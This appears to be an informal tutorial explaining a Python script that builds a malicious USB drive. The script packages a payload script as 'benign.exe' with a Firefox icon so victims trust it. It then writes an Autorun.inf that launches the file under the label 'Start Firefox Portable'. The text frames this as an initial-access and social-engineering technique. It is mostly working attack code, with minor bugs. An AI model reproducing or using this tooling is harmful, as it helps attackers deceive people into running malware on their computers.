Autorun is a file that automatically run, when usb is plugged into computer.

Now in current version of window, autorun is unavailable. Because oviously running program by default when you plugin usb can create a security risk.

However, some computers have auto enabled, making it a viable initial access vector.

In the cases, where thats no the case, then a lot of this technique is going to be useful in a social engineering attack. So you can create an possible link for executable, so someone might think it as legitimate and then run it. Then it automatically run the executable.

Code Discussion:

import PyInstaller._main_
As we see at the top of the file, we are using PYInstaller to create a windows executable from a python script. This is helpful because the python script might not be runnable at the target system. May be they dont have python installed. If you have a self contained executable, it cant run window by making use of this.
So it is useful for autorun and more useful in general for phising attack.

import shutil
import os
Here we are using shutil for couple of command and using os for Operating system command.

filename = "malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"

Here we got the definition of variable that we are going to be using throught the rest of the script. 
filename here is the name of the malicious executable. In our case, its not particularly malicious for demonstation. Its an example of the python file and so you can 
easily write to be malicious and dangerous in other ways. 

We also have executable name "benign.exe". In this case, we can change to something else as part of social engineering attack.
We also have icon here. One thing that py installer allow us to do was , is to set the display icon for that executable.This is helpful bcoz many icon you can trust and run it (Use very recognizable images). In this case we are using famous "Firefox.ico" icon as display icon for malicious executable.

pwd = "X:"
usbdir = os.path.join(pwd,"USB")
Then getting current working directory or any directory if needed. And then we defining directory for hypothetical usb drive. In our case we are going to use a folder inside our current/mentioned working directory called "USB". But you can see how you can easily change this directory to mounted USB drive on our computer as we built this. so that we create a malicious USB.


if os.path.isfile(exename):
    os.remove(exename)
print("Creating EXE")
Then this is little cleanup code here, saying that if the executable already exist, we should remove it because the operation which we going to perform wont work , when we try to move it on to the USB (if that usb already exist).




Then our first step is to use PyInstaller to create a malicious executable. The below is the actual comamnd for that.
PyInstaller.__main__.run([
    "malicious.py"
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name="+exename,
    "--icon="+icon
])
print("EXE created")
So here, we are calling PyInstaller main function and then calling run inside of that. And reason why that we have this slightly different syntax here for function calls is typically the PyInstaller is designed to be run as a standalone program on the command line terminal etc. However since its python related, its designed to allow you to run within python as well in this way. And so calling this is similar to say Pyinstaller and then passing a following a list of argument such as malicious.py ,
put evertything into a single file,
cleanup everything before doing so,
we set a log level to Error here, so that it doesnt print a bunch of information (when pyinstaller is failing), 
we then specify the output name of the executable that we creating (in our case it is benign.exe), 
and we specify it wants the icon to be set to. (In our case, its a firefox icon)

Again the above is more useful for socail engineering usecase, where we drop of USB that has a promising looking executable on it, rather than a autorun usecase that have potentially this executable would be hidden on the USB drive.

And so, when we call this command, its going to call a pyInstaller in a wrapper of python file in a self contained executable.

# clean up after PyInstaller
shutil.move(os.path.join(pwd,"dist",exename),pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")

Then we need to move into a cleanup stuff. PyInstaller by default created few directories and for example, its create a "dist" directory wher the final executable going to be placed. And so we going to be move that for current working directory. And then clean up the dist and build directory and pycache directory.
So that we have a cleaned folder once we done that. And alsoe we are remove a temporary file or configuration file called "benign.exe.spec" which talks about the specification. 
So at this point, what we have is a python script that wrapped in to a self contained or executable. Its doesnt need python to be installed on target machine to run. Everything that it need is bundled inside the executable.


# create AutoRun File
with open("Autorun.inf","w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon="+exename+"\n")
NExt few line of code mentioned above are designed to implement the autorun part of our attack. SO again its not much useful and matter when OS explicitly setup autorun. But still useful for looking in a legacy system that autorun is not been disabled.
And so we are going to now use python file io to create a file called "Autorun.inf" which is the file that has to place on this USB drive and to cause it to run automatically. 
o.write("(Autorun)\n")
And the these are lines of code that we Autorun in parenthesis on the ownline and instruction of what to do. So its suppose to open "benign.exe". Then its going to start firefox portable (may be take this action on the prompt), then label this as "My USB" and then we specify the icon.







